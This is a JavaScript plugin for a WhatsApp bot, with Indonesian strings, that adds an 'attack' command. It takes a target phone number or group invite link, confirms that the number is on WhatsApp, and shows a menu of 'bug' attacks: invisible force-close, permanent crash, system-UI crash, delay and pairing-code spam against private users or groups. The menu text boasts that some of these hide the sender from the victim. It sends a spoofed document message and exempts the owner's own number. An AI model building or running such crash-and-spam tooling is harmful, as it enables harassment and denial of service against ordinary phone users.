const fs = require('fs');

let handler = async (m, {
	conn,
	text,
	command,
	prefix,
	cmd,
	config
}) => {
	if (!text) return m.reply(`\`Example:\` ${cmd} 62xxx ( for private )\n\n\`Example:\` ${cmd} https://chat.whatsapp.com/ ( for group )`);

	const cleaned = text.replace(/[^0-9]/g, '');
	const isGroupLink = text.includes('https://chat.whatsapp.com/');
	const isNumber = /^\+?(\d{9,15})$/.test(cleaned);

	if (config.owner.includes(cleaned) || cleaned === "6281938830020") return conn.sendAds(m.chat, {
		text: `Dilarang menggunakan no itu karna dia adalah owner saya`,
		title: `Powered by ${config.name}`
	})

	if (!isNumber && !isGroupLink) {
		return m.reply('Format tidak dikenali. Gunakan nomor WA atau link grup.');
	}

	const bugCommands = isNumber ? [{
				title: 'Force Close Invisible',
				command: 'crashinvisible',
				help: 'Power 70% Fc Invisible'
			},
			{
			   title: 'Force Close Permanen',
			   command: 'crash-permanen',
			   help: 'Power 100% No Invisible target can see'
			},
			{
				title: 'Delay Invisible',
				command: 'delayinvisible',
				help: 'Power 100% Delay Invisible'
			},
			{
			   title: 'Crash System Ui',
			   command: 'crash-ui',
			   help: 'Power 75% not sup all devices'
			},
			{
			    title: 'Spam Pairing',
			    command: 'spampairing',
			    help: 'pranking friends'
			}
		] :
		isGroupLink ? [{
			title: '',
			command: 'bug-gcv1',
			help: 'Bug WhatsApp Group versi 1'
		}] : [];

	const target = isNumber ?
		text.replace(/[^0-9]/g, '') :
		isGroupLink ?
		text.split('https://chat.whatsapp.com/')[1] :
		'';
		
	if (isNumber) {
	  let cek = await conn.onWhatsApp(target + `@s.whatsapp.net`);
	  if (cek.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`);
	}
	
	const flowActions = [{
		buttonId: `${prefix}menu`,
		buttonText: {
			displayText: 'menu'
		},
		type: 4,
		nativeFlowInfo: {
			name: 'single_select',
			paramsJson: JSON.stringify({
				title: (isNumber ? 'Select Bug Type' : 'Select Bug Type') + '\n' +
					(bugCommands.map(cmd => `• ${cmd.help || cmd.command}`).join('\n') || 'No help available'),
				sections: [{
					title: isNumber ? "Private Bug Commands" : "Group Bug Commands",
					highlight_label: isNumber ? "Private Target" : "Group Target",
					rows: bugCommands.map(cmd => ({
						title: `${cmd.title}`,
						description: cmd.help || 'Tanpa deskripsi',
						id: `${prefix}${cmd.command} ${target}`
					}))
				}]
			})
		},
		viewOnce: true
	}];

	const readmore = String.fromCharCode(8206).repeat(4001)

	const simplemenu = `
*Fc Invisible*
Moderately strong, but not perfect  
Advantage: victim can't see sender

*No Invisible*
Very powerful, can cause permanent crash  
Disadvantage: victim might see sender (depends on phone)
${readmore}
- *Attack:* ${target}`;
	const name = 'Catozolala';
	const image = global.media || null;

	const buttonMessage = {
		document: fs.readFileSync("./package.json"),
		fileName: getUcapan(),
		fileLength: Infinity,
		pageCount: Infinity,
		mimetype: 'application/pdf',
		caption: simplemenu,
		jpegThumbnail: global.media,
		footer: `Powered by ${name}`,
		buttons: flowActions,
		headerType: 6,
		viewOnce: true,
		forwardingScore: 99999,
		isForwarded: true,
		mentions: [m.sender, ...(isNumber ? [`${target}@s.whatsapp.net`] : [])],
		contextInfo: {
			thumbnail: image,
			forwardingScore: 99999,
			isForwarded: true,
			mentionedJid: [m.sender, ...(isNumber ? [`${target}@s.whatsapp.net`] : [])],
			externalAdReply: {
				sourceUrl: `instagram.com`,
				containsAutoReply: true,
				mediaType: 1,
				thumbnail: global.media,
				renderLargerThumbnail: true,
				title: name,
				body: 'Powered by whatsapp'
			}
		}
	};

	return conn.sendMessage(m.chat, buttonMessage, {
		quoted: conn.packSticker
	});
};

handler.tags = ["bug"];
handler.help = ["62xxx"];
handler.command = ["attack"];

module.exports = handler;

function getUcapan() {
	const hour = new Date().getHours();
	if (hour < 4) return "Selamat Tengah Malam";
	if (hour < 10) return "Selamat Pagi";
	if (hour < 15) return "Selamat Siang";
	if (hour < 18) return "Selamat Sore";
	return "Selamat Malam";
}